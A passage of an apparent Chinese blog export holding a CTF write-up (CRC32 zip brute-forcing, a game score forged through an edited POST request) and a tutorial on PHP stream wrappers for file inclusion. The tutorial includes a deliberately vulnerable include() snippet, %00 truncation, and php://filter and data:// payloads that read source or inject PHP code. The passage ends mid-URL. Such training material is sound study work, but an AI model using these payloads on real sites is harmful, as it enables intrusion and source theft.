class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Planet defense game<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/style.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">canvas</span> <span class=\"attr\">id</span>=<span class=\"string\">\"canvas\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">canvas</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/index.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点进去拉到最后有几条提示</p>\n<p><img src=\"/pic/8.png\" alt=\"\"></p>\n<p>生成一个http请求，将分数发到服务器，将结果显示。</p>\n<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10001</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">record&#x3D;23</span><br></pre></td></tr></table></figure>\n\n<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"安恒元旦月赛\"><a href=\"#安恒元旦月赛\" class=\"headerlink\" title=\"安恒元旦月赛\"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>","more":"<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"爆破鬼才\"><a href=\"#爆破鬼才\" class=\"headerlink\" title=\"爆破鬼才\"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>\n<p>解压后还是一个压缩包</p>\n<p><img src=\"/pic/6.png\" alt=\"\"></p>\n<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.printable</span><br><span class=\"line\">crc = <span class=\"number\">0x7d90ee19</span>   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic :</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> crc == (binascii.crc32(s) &amp; <span class=\"number\">0xffffffff</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">print</span>  s</span><br></pre></td></tr></table></figure>\n\n<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>\n<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>\n<p>最后跑出来的密码是20140224。拿着key解密</p>\n<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>\n<p><img src=\"/pic/7.png\" alt=\"\"></p>\n<p>玩了一把后查看源码，发现有一个js。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Planet defense game<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/style.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">canvas</span> <span class=\"attr\">id</span>=<span class=\"string\">\"canvas\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">canvas</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/index.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点进去拉到最后有几条提示</p>\n<p><img src=\"/pic/8.png\" alt=\"\"></p>\n<p>生成一个http请求，将分数发到服务器，将结果显示。</p>\n<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10001</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">record&#x3D;23</span><br></pre></td></tr></table></figure>\n\n<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>"},{"title":"关于PHP伪协议的分析","date":"2020-01-03T12:17:47.000Z","_content":"\n### 0X00 简介\n\nPHP支持的协议和封装协议\n\n- [file://](https://www.php.net/manual/zh/wrappers.file.php)   \n\n- [http://](https://www.php.net/manual/zh/wrappers.http.php)\n\n- [ftp://](https://www.php.net/manual/zh/wrappers.ftp.php)\n\n- [php://](https://www.php.net/manual/zh/wrappers.php.php)     \n\n  <!--more-->\n\n- [zlib://](https://www.php.net/manual/zh/wrappers.compression.php)\n\n- [data://](https://www.php.net/manual/zh/wrappers.data.php)    \n\n- [glob://](https://www.php.net/manual/zh/wrappers.glob.php)\n\n- [phar://](https://www.php.net/manual/zh/wrappers.phar.php)\n\n- [ssh2://](https://www.php.net/manual/zh/wrappers.ssh2.php)\n\n- [rar://](https://www.php.net/manual/zh/wrappers.rar.php)\n\n- [ogg://](https://www.php.net/manual/zh/wrappers.audio.php)\n\n- [expect://](https://www.php.net/manual/zh/wrappers.expect.php)\n\n常见的文件包含函数：\n\n**1. include函数**\n\n通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用\n\n不能够读取自己，否则会出现逻辑错误\n\n如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容\n\n若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php\n\n使用时如果有多个文件符合，只会输出第一个\n\n**2. highlight_file函数**\n\n将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件\n如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串\n\n#### 3. show_source函数\n\n上面函数的别名，功能是一样的\n\n**4. file_get_contents函数**\n\n将一个文件读入一个字符串\n包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密\n\n**5. fopen函数**\n\n因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容\n\n**6. readfile函数**\n\n功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)\n\n**7. file函数**\n\n功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容\n\n\n\nallow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。\n\nallow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。\n\n### 0x01  file://\n\nfile://不受`allow_url_fopen、allow_url_include·`影响\n\n> file:// [文件的绝对路径和文件名]\n\nhttp://127.0.0.1/temp.php?file=file:///wamp/www/1.php\n\n\n```\n<?php\ninclude($_GET['file']);\n?>\n```\n\n![](/pic/14.png)\n\n**截断**\n\n若读取的文件为非PHP后缀，在php版本<=5.2可使用%00截断\n\n```\n<?php\ninclude($_GET['file'].’.php’);\n?>\n```\n\n### 0x02 php://\n\n无需`allow_url_fopen on`，仅`php://input、 php://stdin、 php://memory 、php://temp` 需要开启`allow_url_include`。\n\nphp:// 访问各个输入/输出流（I/O streams）\n\n1. #### php://filter \n\n| 属性                                                         | 支持                                                         |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | No                                                           |\n| 受限于 [allow_url_include](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include) | 仅 *php://input*、 *php://stdin*、 *php://memory* 和 *php://temp*。 |\n| 允许读取                                                     | 仅 *php://stdin*、 *php://input*、 *php://fd*、 *php://memory* 和 *php://temp*。 |\n| 允许写入                                                     | 仅 *php://stdout*、 *php://stderr*、 *php://output*、 *php://fd*、 *php://memory* 和 *php://temp*。 |\n| 允许追加                                                     | 仅 *php://stdout*、 *php://stderr*、 *php://output*、 *php://fd*、 *php://memory* 和 *php://temp*（等于写入） |\n| 允许同时读写                                                 | 仅 *php://fd*、 *php://memory* 和 *php://temp*。             |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | 仅 *php://memory* 和 *php://temp*。                          |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No                                                           |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No                                                           |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No                                                           |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No                                                           |\n| 仅仅支持 [stream_select()](https://www.php.net/manual/zh/function.stream-select.php) | *php://stdin*、 *php://stdout*、 *php://stderr*、 *php://fd* 和 *php://temp*。 |\n\n​\ta. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （*include、highlight_file、show_source、readfile*可用）\n\n| 名称                        | 描述                                                         |\n| :-------------------------- | :----------------------------------------------------------- |\n| *resource=<要过滤的数据流>* | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |\n| *read=<读链的筛选列表>*     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\\|*）分隔。 |\n| *write=<写链的筛选列表>*    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\\|*）分隔。 |\n| *<；两个链的筛选列表>*      | 任何没有以 *read=* 或 *write=* 作前缀 的筛选器列表会视情况应用于读或写链。 |\n\n常用筛选过滤列表\n\n> 1. string.rot13  rot13加密\n> 2. string.toupper   转换成大写\n> 3. string.tolower   转换成小写\n> 4. string.srip_tags   去除标签\n> 5. convert.base64-encode & convert.base64-decode\n> 6. convert.quoted-printable-encode & convert.quoted-printable-decode\n\n![](/pic/15.png)\n\n![](/pic/16.png)\n\n![](/pic/17.png)已经把< >中的数据去除 所以已经没有数据\n\n\n\n2. #### php://input\n\n    *enctype=\"multipart/form-data\"* 的时候 php://input 是无效的。此协议多用于命令执行需要**allow_url_include：on**\n\n​      ![](/pic/18.png) \n\n​       ![](/pic/19.png)\n\n3. ### php://output \n\n   php://output 是一个只写的数据流， 允许你以 [print](https://www.php.net/manual/zh/function.print.php) 和 [echo](https://www.php.net/manual/zh/function.echo.php) 一样的方式 写入到输出缓冲区。\n\n### 0x03 zip://, bzip2://, zlib://协议\n\nzip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。\n\n| 属性                                                         | 支持                                            |\n| :----------------------------------------------------------- | :---------------------------------------------- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | No                                              |\n| 允许读取                                                     | Yes                                             |\n| 允许写入                                                     | Yes（除了 *zip://*）                            |\n| 允许附加                                                     | Yes（除了 *zip://*）                            |\n| 允许同时读写                                                 | No                                              |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | No，请使用普通的 *file://* 封装器统计压缩文件。 |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No，请使用 *file://* 封装器删除压缩文件。       |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No                                              |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No                                              |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No                                              |\n\n#### 1. zip://协议\n\nzip:// [压缩文件路径]#[压缩文件内的子文件]\n\n测试失败 ,报错\n\n**【bzip2://协议】**\n\n**使用方法：**\n\ncompress.bzip2://[压缩文件地址]\n\n测试失败 没有返回数据\n\n#### 3. zlib://协议\n\ncompress.zlib://[压缩文件地址]\n\n![](/pic/20.png)\n\n### 0x04 data://\n\n经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO\n\n| 属性                                                         | 支持 |\n| :----------------------------------------------------------- | :--- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | Yes  |\n| 受限于 [allow_url_include](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include) | Yes  |\n| 允许读取                                                     | Yes  |\n| 允许写入                                                     | No   |\n| 允许追加                                                     | No   |\n| 允许同时读写                                                 | No   |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | No   |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No   |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No   |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No   |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No   |\n\nhttp://localhost/temp.php?file=data://text/plain,<?php phpinfo()?>\n\nhttp://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nhttp://localhost/temp.php?file=data:text/plain,<?php phpinfo()?>\n\nhttp://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\n![](/pic/21.png)\n\n### 0x05 总结\n\n![](/pic/22.png)","source":"_posts/关于PHP伪协议的分析.md","raw":"---\ntitle: 关于PHP伪协议的分析\ndate: 2020-01-03 20:17:47\ntags:\n - php\n - web\ncategories: \n - 日常积累\n---\n\n### 0X00 简介\n\nPHP支持的协议和封装协议\n\n- [file://](https://www.php.net/manual/zh/wrappers.file.php)   \n\n- [http://](https://www.php.net/manual/zh/wrappers.http.php)\n\n- [ftp://](https://www.php.net/manual/zh/wrappers.ftp.php)\n\n- [php://](https://www.php.net/manual/zh/wrappers.php.php)     \n\n  <!--more-->\n\n- [zlib://](https://www.php.net/manual/zh/wrappers.compression.php)\n\n- [data://](https://www.php.net/manual/zh/wrappers.data.php)    \n\n- [glob://](https://www.php.net/manual/zh/wrappers.glob.php)\n\n- [phar://](https://www.php.net/manual/zh/wrappers.phar.php)\n\n- [ssh2://](https://www.php.net/manual/zh/wrappers.ssh2.php)\n\n- [rar://](https://www.php.net/manual/zh/wrappers.rar.php)\n\n- [ogg://](https://www.php.net/manual/zh/wrappers.audio.php)\n\n- [expect://](https://www.php.net/manual/zh/wrappers.expect.php)\n\n常见的文件包含函数：\n\n**1. include函数**\n\n通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用\n\n不能够读取自己，否则会出现逻辑错误\n\n如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容\n\n若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php\n\n使用时如果有多个文件符合，只会输出第一个\n\n**2. highlight_file函数**\n\n将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件\n如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串\n\n#### 3. show_source函数\n\n上面函数的别名，功能是一样的\n\n**4. file_get_contents函数**\n\n将一个文件读入一个字符串\n包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密\n\n**5. fopen函数**\n\n因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容\n\n**6. readfile函数**\n\n功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)\n\n**7. file函数**\n\n功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容\n\n\n\nallow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。\n\nallow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。\n\n### 0x01  file://\n\nfile://不受`allow_url_fopen、allow_url_include·`影响\n\n> file:// [文件的绝对路径和文件名]\n\nhttp://127.0.0.1/temp.php?file=file:///wamp/www/1.php\n\n\n```\n<?php\ninclude($_GET['file']);\n?>\n```\n\n![](/pic/14.png)\n\n**截断**\n\n若读取的文件为非PHP后缀，在php版本<=5.2可使用%00截断\n\n```\n<?php\ninclude($_GET['file'].’.php’);\n?>\n```\n\n### 0x02 php://\n\n无需`allow_url_fopen on`，仅`php://input、 php://stdin、 php://memory 、php://temp` 需要开启`allow_url_include`。\n\nphp:// 访问各个输入/输出流（I/O streams）\n\n1. #### php://filter \n\n| 属性                                                         | 支持                                                         |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | No                                                           |\n| 受限于 [allow_url_include](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include) | 仅 *php://input*、 *php://stdin*、 *php://memory* 和 *php://temp*。 |\n| 允许读取                                                     | 仅 *php://stdin*、 *php://input*、 *php://fd*、 *php://memory* 和 *php://temp*。 |\n| 允许写入                                                     | 仅 *php://stdout*、 *php://stderr*、 *php://output*、 *php://fd*、 *php://memory* 和 *php://temp*。 |\n| 允许追加                                                     | 仅 *php://stdout*、 *php://stderr*、 *php://output*、 *php://fd*、 *php://memory* 和 *php://temp*（等于写入） |\n| 允许同时读写                                                 | 仅 *php://fd*、 *php://memory* 和 *php://temp*。             |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | 仅 *php://memory* 和 *php://temp*。                          |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No                                                           |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No                                                           |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No                                                           |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No                                                           |\n| 仅仅支持 [stream_select()](https://www.php.net/manual/zh/function.stream-select.php) | *php://stdin*、 *php://stdout*、 *php://stderr*、 *php://fd* 和 *php://temp*。 |\n\n​\ta. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （*include、highlight_file、show_source、readfile*可用）\n\n| 名称                        | 描述                                                         |\n| :-------------------------- | :----------------------------------------------------------- |\n| *resource=<要过滤的数据流>* | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |\n| *read=<读链的筛选列表>*     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\\|*）分隔。 |\n| *write=<写链的筛选列表>*    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\\|*）分隔。 |\n| *<；两个链的筛选列表>*      | 任何没有以 *read=* 或 *write=* 作前缀 的筛选器列表会视情况应用于读或写链。 |\n\n常用筛选过滤列表\n\n> 1. string.rot13  rot13加密\n> 2. string.toupper   转换成大写\n> 3. string.tolower   转换成小写\n> 4. string.srip_tags   去除标签\n> 5. convert.base64-encode & convert.base64-decode\n> 6. convert.quoted-printable-encode & convert.quoted-printable-decode\n\n![](/pic/15.png)\n\n![](/pic/16.png)\n\n![](/pic/17.png)已经把< >中的数据去除 所以已经没有数据\n\n\n\n2. #### php://input\n\n    *enctype=\"multipart/form-data\"* 的时候 php://input 是无效的。此协议多用于命令执行需要**allow_url_include：on**\n\n​      ![](/pic/18.png) \n\n​       ![](/pic/19.png)\n\n3. ### php://output \n\n   php://output 是一个只写的数据流， 允许你以 [print](https://www.php.net/manual/zh/function.print.php) 和 [echo](https://www.php.net/manual/zh/function.echo.php) 一样的方式 写入到输出缓冲区。\n\n### 0x03 zip://, bzip2://, zlib://协议\n\nzip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。\n\n| 属性                                                         | 支持                                            |\n| :----------------------------------------------------------- | :---------------------------------------------- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | No                                              |\n| 允许读取                                                     | Yes                                             |\n| 允许写入                                                     | Yes（除了 *zip://*）                            |\n| 允许附加                                                     | Yes（除了 *zip://*）                            |\n| 允许同时读写                                                 | No                                              |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | No，请使用普通的 *file://* 封装器统计压缩文件。 |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No，请使用 *file://* 封装器删除压缩文件。       |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No                                              |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No                                              |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No                                              |\n\n#### 1. zip://协议\n\nzip:// [压缩文件路径]#[压缩文件内的子文件]\n\n测试失败 ,报错\n\n**【bzip2://协议】**\n\n**使用方法：**\n\ncompress.bzip2://[压缩文件地址]\n\n测试失败 没有返回数据\n\n#### 3. zlib://协议\n\ncompress.zlib://[压缩文件地址]\n\n![](/pic/20.png)\n\n### 0x04 data://\n\n经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO\n\n| 属性                                                         | 支持 |\n| :----------------------------------------------------------- | :--- |\n| 受限于 [allow_url_fopen](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen) | Yes  |\n| 受限于 [allow_url_include](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include) | Yes  |\n| 允许读取                                                     | Yes  |\n| 允许写入                                                     | No   |\n| 允许追加                                                     | No   |\n| 允许同时读写                                                 | No   |\n| 支持 [stat()](https://www.php.net/manual/zh/function.stat.php) | No   |\n| 支持 [unlink()](https://www.php.net/manual/zh/function.unlink.php) | No   |\n| 支持 [rename()](https://www.php.net/manual/zh/function.rename.php) | No   |\n| 支持 [mkdir()](https://www.php.net/manual/zh/function.mkdir.php) | No   |\n| 支持 [rmdir()](https://www.php.net/manual/zh/function.rmdir.php) | No   |\n\nhttp://localhost/temp.php?file=data://text/plain,<?php phpinfo()?>\n\nhttp://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nhttp://localhost/temp.php?file=data:text/plain,<?php 